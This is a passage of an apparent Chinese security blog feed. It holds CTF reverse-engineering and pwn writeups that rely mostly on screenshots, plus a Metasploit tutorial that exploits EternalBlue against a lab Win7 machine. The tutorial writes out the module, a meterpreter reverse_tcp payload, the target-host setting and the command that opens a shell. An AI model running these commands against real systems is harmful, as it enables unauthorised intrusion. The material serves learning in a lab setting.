C = add(D, shift(add(C, add(add(ifunc(D, A, B), M2), y[62])), 15))
B = add(C, shift(add(B, add(add(ifunc(C, D, A), M9), y[63])), 21))
 
# 第五步
A = add(A, AA)
B = add(B, BB)
C = add(C, CC)
D = add(D, DD)
 
# 输出得到的密文
answer = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D)
print(hex(int(answer, 2)))
</code></pre>
<p>实验结果：<br>
<img src="https://zyyiszyy.github.io/post-images/1615261397816.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[hackme逆向题目部分WP]]></title>
        <id>https://zyyiszyy.github.io/post/hackme-ni-xiang-ti-mu-bu-fen-wp/</id>
        <link href="https://zyyiszyy.github.io/post/hackme-ni-xiang-ti-mu-bu-fen-wp/">
        </link>
        <updated>2021-01-09T09:29:53.000Z</updated>
        <content type="html"><![CDATA[<p>注：此平台对我这个新手来说能学会不少东西，比如.net平台的反编译，z3py工具的使用，checksec、ROPgadget命令的使用，java反编译，python字节码文件的反编译等等，还通过一些题目学到了一些爆破脚本怎么写，对本地时间的判断和怎么用脚本不断的更改本地时间……每次做一道题目仿佛我离逆向这个入门门槛更近了一步，每做一道题目都能进步许多。不过后来做题难度不断提升，做到后面分数到达200的时候，几乎每道题目做起来都很困难，个人水平进步有限，经常分析能分析到不少东西，但离做出题目还是相差甚远，所以经常求助于大佬的博客。如果有地方出现问题，还望师傅们谅解。</p>
<h2 id="helloworld">Helloworld</h2>
<p>先看文件位数和类型，发现是32位ELF文件。<br>
<img src="https://zyyiszyy.github.io/post-images/1615189735160.png" alt="" loading="lazy"><br>
拖到32位ida里，看到源代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615189740365.png" alt="" loading="lazy"><br>
大致逻辑输入n，判断相等就输出flag，很简单，在kali输入数字314159265，此时突然发现这是Π，只是没有小数点，输入进去如图得到flag<br>
<img src="https://zyyiszyy.github.io/post-images/1615189751649.png" alt="" loading="lazy"></p>
<h2 id="simple">Simple</h2>
<p>查看文件细节，32位elf文件，无壳。<br>
<img src="https://zyyiszyy.github.io/post-images/1615189825818.png" alt="" loading="lazy"><br>
32位ida打开，找到关键代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615189833500.png" alt="" loading="lazy"><br>
发现是首先判断输入字符串如果有字符ASCII为10，则对应位变为ASCII为0的字符，否则check加1。看check发现没有减1后为10的，所以全-1求字符串即为flag花括号里内容，脚本如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615189842484.png" alt="" loading="lazy"></p>
<h2 id="passthis">Passthis</h2>
<p>检查文件，32为exe程序，直接可以cmd里运行。<br>
<img src="https://zyyiszyy.github.io/post-images/1615189890103.png" alt="" loading="lazy"><br>
拖入32位ida里运行,查看关键代码，发现判断一串字符和输入flag按位异或看是否-121，都是的话输出good flag。<br>
<img src="https://zyyiszyy.github.io/post-images/1615189898195.png" alt="" loading="lazy"><br>
看懂逻辑写脚本如下，得到flag：<br>
<img src="https://zyyiszyy.github.io/post-images/1615189903491.png" alt="" loading="lazy"></p>
<h2 id="accumulator">Accumulator</h2>
<p>查看伪代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190316805.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615189977738.png" alt="" loading="lazy"><br>
找到了关键函数和主函数，key_function是check函数，里面找到一个数组：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190008511.png" alt="" loading="lazy"><br>
将其导出，全选按shift+E，选择合适的导出方式：结果如下<br>
<img src="https://zyyiszyy.github.io/post-images/1615190015476.png" alt="" loading="lazy"><br>
直接看伪代码长时间仍没有看懂，因题目名字为accumlator（累加器），结合伪代码猜测是将每个数累加然后与数组比较，写脚本试一下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190021941.png" alt="" loading="lazy"><br>
可以看到flag。<br>
此题后来看别人博客，发现大多都感觉伪代码逻辑有些混乱，因为是用到sha512直接逆向就放弃了，根据动态调试分析得出逻辑大致就是累加然后和数组判断。</p>
<h2 id="pyyy">Pyyy</h2>
<p>下载文件发现是.pyc结尾，是python编译生成的二进制文件，<br>
<img src="https://zyyiszyy.github.io/post-images/1615190396464.png" alt="" loading="lazy"><br>
下载uncompyle6进行反编译，得到python源文件命名为pyyy.py：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190409352.png" alt="" loading="lazy"><br>
打开源文件代码如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190416089.png" alt="" loading="lazy"><br>
这里有一个输入，然后有一个判断，这里可以直接将输入和判断代码注释掉，执行直接就是flag<br>
<img src="https://zyyiszyy.github.io/post-images/1615190436518.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615190444362.png" alt="" loading="lazy"></p>
<h2 id="ccc">CCC</h2>
<p>Ida打开文件，查看主函数内容如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190563200.png" alt="" loading="lazy"><br>
这时发现一个verify函数，应该是判断flag的函数，进入函数发现如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190588746.png" alt="" loading="lazy"><br>
逻辑大概是每次增加三位做crc32循环冗余检测，结果和hashes数组里的值判断，相等返回真。查看hashes数组如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190600806.png" alt="" loading="lazy"><br>
写脚本每次增加三位爆破，如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190613579.png" alt="" loading="lazy"></p>
<h2 id="bitx">Bitx</h2>
<p>先查看文件类型，是32位elf，在ida中打开，查看判断结果为good的地方,即判断函数：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190698273.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615190711231.png" alt="" loading="lazy"><br>
比较容易看懂，把地址0x804a040处的数据依次操作，然后flag对应的位+9后<br>
与之进行比较，先找到数据如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190718304.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615190749193.png" alt="" loading="lazy"><br>
写脚本如下，得到flag：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190770365.png" alt="" loading="lazy"></p>
<h2 id="gccc">GCCC</h2>
<p>先正常分析文件类型，并用对应的ida打开，发现如下<br>
<img src="https://zyyiszyy.github.io/post-images/1615190816910.png" alt="" loading="lazy"><br>
因此发现是使用的IL语言，是.net平台的应用程序，IL是一种中间语言，需要其专门的反编译器，使用.net Reflector对其反编译，然后找到主函数代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190823422.png" alt="" loading="lazy"><br>
比较容易看出函数逻辑，输入的num，buffer和num和num3异或，然后判断是否是大写字母和{}“ ”集合的内容，如果是就放入字符串str，观察后面代码又判断FLAG{}，所以知道str就是flag，写脚本如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190828804.png" alt="" loading="lazy"></p>
<h2 id="what-the-hell">What-the-hell</h2>
<p>Ida打开查看主函数代码如图：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190932984.png" alt="" loading="lazy"><br>
Calc_key3函数如图，再查看Check_prime函数，先看1和2情况，再看是否大于3且为奇数，再看是否为3倍数，一层层检查判断是否为素数：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190949841.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615190984951.png" alt="" loading="lazy"><br>
再看what函数里,发现是递归求斐波那契数列，这里要小心，因为result是整数，所以可能会发生整数溢出：<br>
<img src="https://zyyiszyy.github.io/post-images/1615190995544.png" alt="" loading="lazy"><br>
再查看解密flag函数，发现解密较简单，主要难点不知道a1,a2和key：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191028614.png" alt="" loading="lazy"><br>
这时搜索资料发现有种方法约束求解，用z3py工具，这里写脚本不熟练，思路是先根据calc_key3函数里的三个if条件作为约束求解，再根据素数排除一部分解。斐波那契判断时可能会发生整数溢出，python写此功能不熟练，所以换C++判断排除剩下的解：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191038205.png" alt="" loading="lazy"><br>
上图求解结果为：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191055366.png" alt="" loading="lazy"><br>
判断a1是否时斐波那契数，代码和结果如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191067530.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191086436.png" alt="" loading="lazy"><br>
另一个长时间运行不出结果，判断猜测a1=4284256177,a2=1234567890,key=a2*887+1=1095061718431。<br>
还有一处要注意的是，参数传递时强制转化为了int和unsigned int，会发生整数溢出，在脚本里要注意体现。<br>
解密脚本和运行结果如图：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191168505.png" alt="" loading="lazy"></p>
<h2 id="unpackme">unpackme</h2>
<p>由题目要求得知是有壳程序，先文件分析查看什么壳和判断多少位程序：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191215727.png" alt="" loading="lazy"><br>
由上图可知是upx壳，使用upx –d xxx脱壳发现提示如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191221427.png" alt="" loading="lazy"><br>
查阅资料，发现是一种加壳后的再次保护，用16进制文件编辑器打开，发现如下信息：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191253370.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191305340.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191310150.png" alt="" loading="lazy"><br>
16进制编辑器打开界面<br>
发现标志位都被修改，将ctf改为UPX，最后？改为！，如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191267346.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191272898.png" alt="" loading="lazy"><br>
然后保存到文件，再次命令脱壳，脱壳成功：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191338614.png" alt="" loading="lazy"><br>
直接运行发现失败，32位ida打开，发现函数和字符串都比较正常，判断应该是第一步脱壳成功了：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191343445.png" alt="" loading="lazy"><br>
找关键代码，最终定位如下图的代码处：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191384784.png" alt="" loading="lazy"><br>
这里str是已知的，pbData已知的，就char string未知，直接爆破，代码和结果如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191390252.png" alt="" loading="lazy"></p>
<h2 id="2018-rev">2018-rev</h2>
<p>先在KALI里打开文件，发现提示如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191449391.png" alt="" loading="lazy"><br>
用ida远程调试，找到判断变量的那几个位置，逐个更改栈或内存内容：<br>
第一个判断jnz，将r13寄存器改为7E2：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191460504.png" alt="" loading="lazy"><br>
单步运行如下图，将rdx的地址里的字节改为01：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191471752.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191479970.png" alt="" loading="lazy"><br>
继续单步运行，如下图判断条件处，将rdx地址的字节改为01，<br>
<img src="https://zyyiszyy.github.io/post-images/1615191487412.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191497636.png" alt="" loading="lazy"><br>
继续单步运行，发现跳到这个位置，jnz跳到判断时间的地方，如果不继续更改就会终止程序，输出要在对应的时间打开，如图：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191592537.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191553496.png" alt="" loading="lazy"><br>
这里再Kali输入指令，不断更改时间，命令代码如图：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191559884.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615191567342.png" alt="" loading="lazy"><br>
前面操作不变，再来一次，即可输出flag：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191613141.png" alt="" loading="lazy"></p>
<h2 id="mov">MOV</h2>
<p>这道题题目提示是mov是图灵完全的，搜索图灵完全的意思大致是mov一个指令便能实现所有指令的功能，能够实现所有的逻辑表达。Ida打开，先查看字符串，能看到一些提示正确flag和错误flag的提示，剩下的很乱：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191656513.png" alt="" loading="lazy"><br>
一开始仗着刚复习过一遍汇编，看看能不能看懂汇编，分析一段时间后无奈放弃，实在是太难了……全是mov指令，跳转在哪都找不到：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191664259.png" alt="" loading="lazy"><br>
查看大佬的题解，发现很多都是拿qira做出来的，还有一位是pin做出来的，自己尝试了下安装环境，一个比一个难装，哎，以后找多点博客再继续尝试安装，经过一些大佬的提示 ，发现这道题存在非预期，也可以说是一个bug，输入只要前面的字符串和flag的相等，就能判断正确：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191670849.png" alt="" loading="lazy"><br>
通过这道题还学会了写这种爆破脚本，怎么判断程序的输出：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191676902.png" alt="" loading="lazy"><br>
执行结果如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191683062.png" alt="" loading="lazy"></p>
<h2 id="a-maze">a-maze</h2>
<p>一道迷宫题目，和平常迷宫题目不一样的是解压得到两个文件，一个是地图文件，一个是走迷宫的主要逻辑（平时都是算法生成地图或者直接列出地图）。ida打开maze，很容易找到关键代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191739514.png" alt="" loading="lazy"><br>
和：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191747818.png" alt="" loading="lazy"><br>
qword_601088是map里的内容，<em>a1是输入的内容，v2判断结果是否到达终点，-1的话到达终点。16进制打开文件，搜索0xFFFFFFFF，其为-1的补码，发现如下有大片-1：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191757125.png" alt="" loading="lazy"><br>
前面代码可以看出，v2左移了9位，然后4</em>（flag&amp;0x7f），后九位是flag决定的，前面的32-9位是由v2决定的。计算0xfb000的v2为2008。然后倒着推flag。<br>
<img src="https://zyyiszyy.github.io/post-images/1615191767790.png" alt="" loading="lazy"><br>
脚本如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191776000.png" alt="" loading="lazy"><br>
运行结果如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615191800631.png" alt="" loading="lazy"></p>
<p>参考：<br>
<a href="http://blog.iyzyi.com/index.php/archives/1106/">http://blog.iyzyi.com/index.php/archives/1106/</a><br>
<a href="https://l1b0.fun/a5a95622/">https://l1b0.fun/a5a95622/</a><br>
<a href="https://m4x.fun/post/hackme.inndy-writeup/">https://m4x.fun/post/hackme.inndy-writeup/</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTCTF2020岁末赛部分WP]]></title>
        <id>https://zyyiszyy.github.io/post/cumtctf2020-sui-mo-sai-bu-fen-wp/</id>
        <link href="https://zyyiszyy.github.io/post/cumtctf2020-sui-mo-sai-bu-fen-wp/">
        </link>
        <updated>2020-12-27T02:09:26.000Z</updated>
        <content type="html"><![CDATA[<p>注：这是一个学期的最后一场比赛，也是检验一个学期学习re成果的时候了，这次算是发挥出自己最大的能力了，自己得分在队伍中也算是占较大比重了。另外，向re新手强推hackme刷题网站，能提升不少能力。这次比赛喜提一等奖，好像是第三名，继续加油。</p>
<h2 id="签到">签到：</h2>
<p>Ida打开就看到flag<br>
<img src="https://zyyiszyy.github.io/post-images/1615181380811.png" alt="" loading="lazy"></p>
<h2 id="zzzz3333333">Zzzz3333333</h2>
<p>Ida打开查找关键代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181400324.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615181406817.png" alt="" loading="lazy"><br>
找到一个判断函数，数了数38个判断条件，又有38个未知数，未知数就是flag，想到用z3py约束求解器，写脚本求解，脚本如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181470963.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615181476257.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615181480916.png" alt="" loading="lazy"><br>
实际出现一点小问题，有一些乱码可能某个数改错了出现了多解，增加判断条件输出不同的解，找正确的那个。</p>
<h2 id="奇怪的exe">奇怪的exe</h2>
<p>下载文件，发现是python写的exe文件。先用pyinstxtractor解包，找到一个名字为3的可疑文件:<br>
<img src="https://zyyiszyy.github.io/post-images/1615181632590.png" alt="" loading="lazy"><br>
16进制编辑器打开发现里面有输入flag等字眼，改名为pyc文件，然后拿去反编译，提示错误，再看16进制编辑页面：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181638380.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615181669038.png" alt="" loading="lazy"><br>
发现magic number错误，用对应的python版本编译一个文件，查看其magic number如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181675215.png" alt="" loading="lazy"><br>
将第一行加到3.py上，再用uncompyle6反编译，得到源码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181681573.png" alt="" loading="lazy"><br>
很容易逆，先异或求s，再对应每三位还原，得到base64加密后的flag，解密得到flag：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181758415.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615181764017.png" alt="" loading="lazy"></p>
<h2 id="ez_code">ez_code</h2>
<p>下载文件发现是python字节码，翻译字节码得到如下代码：</p>
<pre><code>flag=input()
print(flag)
if len(flag)!=36:
    print('wrong length!')
a=[]
t=0
for i in flag:
    if t&amp;1==1:             #偶数
        a.append(ord(i)+128)
    else:
        a.append(ord(i))
    t=t+1
b=a[0]&gt;&gt;5              #f-&gt;3
for i in range(len(a)):
    if i==len(a)-1:
        a[i]=(a[i]*8)&amp;255|b
    else:
        a[i]=(a[i]*8)&amp;255|(a[i+1]&gt;&gt;5)
num=[]
for i in range(2,129):       ##################
    t=False
    for j in range(2,i):
        if i%j==0:
            t=True
    if not t:
        num.append(i)
for i in range(len(num)):
    print(num[i])
c=[0]*len(a)
for i in range(len(a)):       #36
    x1=(a[i]&gt;&gt;4)^(num[i%31]&amp;15)
    x2=(a[i]&amp;15)^(num[i%31]&gt;&gt;4)
    c[i]=x2*16+x1
d=[227,169,227,45,232,33,126,162,195,9,239,187,245,180,69,164,123,185,93,0,198,58,246,149,211,156,218,166,65,41,86,173,121,41,125,167]
#print(len(d))
e=1
for i in range(len(d)):
    if d[i]!=c[i]:
        e=0              #####
if e==1:
    print('you are right!')
else:
    print('wrong')
</code></pre>
<p>可以先根据d[i]=c[i], c[i]=x2*16+x1爆破a[i]。然后再逆向还原，通过分析发现前面代码的大概意思是将a所有位的二进制码左移3位，所以逆向的话右移三位，在根据判断末尾是否为0对应减去128。脚本如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181820797.png" alt="" loading="lazy"></p>
<h2 id="time">time</h2>
<p>先cmd运行文件发现提示：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181894529.png" alt="" loading="lazy"><br>
所以应该有一些运行时的判断条件，ida打开：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181900633.png" alt="" loading="lazy"><br>
这就是为什么直接运行会提示not yet，它会先对运行时本地时间进行判断，符合才会进入主函数，主函数如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181908183.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615181914760.png" alt="" loading="lazy"><br>
先传入参数是一个对时间的式子:<br>
<img src="https://zyyiszyy.github.io/post-images/1615181920825.png" alt="" loading="lazy"><br>
计算结果就是0xd563e400，然后按照字节判断是否是字母或者数字，不是的话就循环下一次，是的话放入x_0里，这里发现除了0x00字节，一共是传入了3位dcU。<br>
<img src="https://zyyiszyy.github.io/post-images/1615181970160.png" alt="" loading="lazy"><br>
接下来是判断flag是否是字母或数字，是的话接着放入x_0地址处，注意这时前面有3个字符的：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181977825.png" alt="" loading="lazy"><br>
然后生成一个先数字，再小写字母，再大写字母的表，放入table里：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181982262.png" alt="" loading="lazy"><br>
接着创建一个数组，存放x_0里字符串对应在table的位置，数组名改为array_666：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181988543.png" alt="" loading="lazy"><br>
下面找到关键函数，点开：<br>
<img src="https://zyyiszyy.github.io/post-images/1615181994957.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615182041534.png" alt="" loading="lazy"><br>
大致就是array里对应i加上flag对应在table里的位置，然后对62求余，其中62就是table的长度，求余结果就是table的下标，然后放入字符串里，这里取名为stringggg，其中array比flag长3位，长在前面传入参数那里，这也使得能够逆向求解。<br>
再回到主函数，最后有两个字符串进行比较，一个就是刚才生成的stringggg，一个是str1：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182047584.png" alt="" loading="lazy"><br>
Str1是已知的：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182054945.png" alt="" loading="lazy"><br>
然后就可以每三位每三位的求flag，脚本如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182059803.png" alt="" loading="lazy"><br>
没有优化脚本，先输入13，12，56就是dcU对应table表里的下标，每次出的3个结果就是下一轮的输入，最后输出完整的flag：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182067002.png" alt="" loading="lazy"></p>
<h2 id="pwn1">pwn1</h2>
<p>ida打开分析代码：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182108196.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615182116356.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615182120812.png" alt="" loading="lazy"><br>
代码很短，先直接读入内容然后放入buf变量，然后将buf的最后一位变为0，n为buf的长度，最后比较s和buf的内容，比较长度为n字节。返回值是v4，在调用函数外面v4又给了result，result==123的话打开shell。虽然代码短但信息量还不少。这里可以通过刚开始字节设置0x00来绕过长度判断那里，再溢出覆盖整数v4为123,对应变量在栈中的位置如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182128070.png" alt="" loading="lazy"><br>
写脚本和运行结果如下：<br>
<img src="https://zyyiszyy.github.io/post-images/1615182133421.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[MSF利用”永恒之蓝“漏洞]]></title>
        <id>https://zyyiszyy.github.io/post/msf-li-yong-yong-heng-zhi-lan-lou-dong/</id>
        <link href="https://zyyiszyy.github.io/post/msf-li-yong-yong-heng-zhi-lan-lou-dong/">
        </link>
        <updated>2020-12-24T09:52:52.000Z</updated>
        <content type="html"><![CDATA[<p>注：此次攻击是在虚拟机内kali系统向win7系统发起攻击。<br>
进入msf，输入：<code>msfconsole</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615257958728.jpg" alt="" loading="lazy"><br>
查找永恒之蓝漏洞模块:<code>search ms17_010</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258389125.png" alt="" loading="lazy"><br>
选择一个模块使用:<code>use exploit/windows/smb/ms17_010_eternalblue</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258010367.png" alt="" loading="lazy"><br>
显示攻击载荷:<code>show payloads</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258085995.png" alt="" loading="lazy"><br>
选择攻击载荷:<code>set payload windows/x64/meterpreter/reverse_tcp payload =&gt;windows/x64/meterpreter/reverse_tcp</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258140083.png" alt="" loading="lazy"><br>
查看该攻击模块的选项:<code>show options</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258262359.png" alt="" loading="lazy"><br>
查看目标主机的ipv4，进入win7命令行，输入<code>ipconfig</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258509640.png" alt="" loading="lazy"><br>
设置required的选项:<code>set rhosts 192.168.183.129 rhosts=&gt;192.168.183.129</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258658092.png" alt="" loading="lazy"><br>
实施攻击:<code>run</code><br>
<img src="https://zyyiszyy.github.io/post-images/1615258698982.png" alt="" loading="lazy"><br>
验证攻击成功:</p>
<pre><code>screemshot              //屏幕截图
shell                          //打开命令行
ipconfig                    //查看靶机ip

</code></pre>
<figure data-type="image" tabindex="1"><img src="https://zyyiszyy.github.io/post-images/1615258871025.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CUMTCTF2020“华为杯”部分WP]]></title>
        <id>https://zyyiszyy.github.io/post/cumtctf2020hua-wei-bei-bu-fen-wp1/</id>
        <link href="https://zyyiszyy.github.io/post/cumtctf2020hua-wei-bei-bu-fen-wp1/">
        </link>
        <updated>2020-10-23T14:17:38.000Z</updated>
        <content type="html"><![CDATA[<p>注：这是参加的第二次ctf比赛，比赛前在攻防世界上刷了一些re方向的题目，算是初步对re有了些感觉吧。这次比赛最大的收获是掌握了pwn的简单栈溢出和整数溢出，大致了解了pwn方向的题目是什么样子。在自己和队友的共同努力下，这次比赛拿到了二等奖，算是自己近段时间的付出得到了一些鼓励吧，接下来再接再厉！</p>
<h2 id="hello_world">Hello_world</h2>
<p>先查看程序类型，发现是 64 位 windows 下运行的程序。</p>
<figure data-type="image" tabindex="1"><img src="https://zyyiszyy.github.io/post-images/1615186327993.png" alt="" loading="lazy"></figure>
<p>先运行一下程序，了解大致情况。</p>
<figure data-type="image" tabindex="2"><img src="https://zyyiszyy.github.io/post-images/1615186390266.png" alt="" loading="lazy"></figure>
<p>使用 64 位 ida 打开，查看字符串：</p>
<figure data-type="image" tabindex="3"><img src="https://zyyiszyy.github.io/post-images/1615186656612.png" alt="" loading="lazy"></figure>
<p>发现’you got it’，猜测是判断字符串正误。点进去找到变量， 交叉引用找到调用它的函数，tab 键找到 C 伪代码如下：</p>
<figure data-type="image" tabindex="4"><img src="https://zyyiszyy.github.io/post-images/1615186661666.png" alt="" loading="lazy"></figure>
<p>运行以下脚本得到 flag。</p>
<figure data-type="image" tabindex="5"><img src="https://zyyiszyy.github.io/post-images/1615186682600.png" alt="" loading="lazy"></figure>
<h2 id="non_name">Non_name</h2>
<p>先查看程序类型，发现是 64 位 windows 下可执行程序。运行程序，查看运行的情况，发现 math 字眼：</p>
<figure data-type="image" tabindex="6"><img src="https://zyyiszyy.github.io/post-images/1615186739500.png" alt="" loading="lazy"></figure>
<p>用 ida64 打开，查看字符串，提示很明显。</p>
<figure data-type="image" tabindex="7"><img src="https://zyyiszyy.github.io/post-images/1615186750285.png" alt="" loading="lazy"></figure>
<p>如下找到关键代码，str1 和 str2 已知，分别 12 个元素和 4 个元素，看懂后实际上就是列一个四元一次方程组。</p>
<figure data-type="image" tabindex="8"><img src="https://zyyiszyy.github.io/post-images/1615186757883.png" alt="" loading="lazy"></figure>
<p>先 python 变十进制，懒着再写脚本，直接在线工具求解：</p>
<p><img src="https://zyyiszyy.github.io/post-images/1615186798468.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615186802740.png" alt="" loading="lazy"></p>
<p>最后按照提示，分别 hex()再改下格式成功提交。</p>
<h2 id="login">Login</h2>
<p>先查看程序类型，是 64 位 ELF 程序。放在 kali 里面运行一下。</p>
<figure data-type="image" tabindex="9"><img src="https://zyyiszyy.github.io/post-images/1615186943018.png" alt="" loading="lazy"></figure>
<p>Ida64 打开，查看字符串。</p>
<figure data-type="image" tabindex="10"><img src="https://zyyiszyy.github.io/post-images/1615186938166.png" alt="" loading="lazy"></figure>
<p>先看到 login succeed，进入看一下，发现是/bin/sh 调用 shell。</p>
<figure data-type="image" tabindex="11"><img src="https://zyyiszyy.github.io/post-images/1615186933153.png" alt="" loading="lazy"></figure>
<p>拿小本本记下其地址：0x 4009E7</p>
<figure data-type="image" tabindex="12"><img src="https://zyyiszyy.github.io/post-images/1615186920623.png" alt="" loading="lazy"></figure>
<p>然后进入输入用户名和密码的代码。</p>
<figure data-type="image" tabindex="13"><img src="https://zyyiszyy.github.io/post-images/1615186952420.png" alt="" loading="lazy"></figure>
<p>发现输入 256 个字符，至此怀疑是栈溢出。</p>
<figure data-type="image" tabindex="14"><img src="https://zyyiszyy.github.io/post-images/1615186983488.png" alt="" loading="lazy"></figure>
<p>查看栈的确是栈溢出的类型，通过用户名输入 0x28 的数据和登录成功的返回地址，写的 exp 如下两种：</p>
<p><img src="https://zyyiszyy.github.io/post-images/1615186987844.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615186990857.png" alt="" loading="lazy"></p>
<p>运行 exp，可打开 shell，cat flag：</p>
<figure data-type="image" tabindex="15"><img src="https://zyyiszyy.github.io/post-images/1615186993979.png" alt="" loading="lazy"></figure>
<h2 id="login_plus">Login_plus</h2>
<p>查看软件类型，发现是 64 位的 ELF 程序。发现很眼熟，和上题表面上多了个 id。</p>
<figure data-type="image" tabindex="16"><img src="https://zyyiszyy.github.io/post-images/1615187074246.png" alt="" loading="lazy"></figure>
<p>进入 ida64 查看字符串，发现很多都一样，也有/bin/sh，但从这里看多了一个 id。</p>
<p><img src="https://zyyiszyy.github.io/post-images/1615187078447.png" alt="" loading="lazy"><br>
<img src="https://zyyiszyy.github.io/post-images/1615187089034.png" alt="" loading="lazy"></p>
<p>这时查看谁调用的 login 函数，又发现一段代码，逻辑也很容易看懂。</p>
<figure data-type="image" tabindex="17"><img src="https://zyyiszyy.github.io/post-images/1615187093349.png" alt="" loading="lazy"></figure>
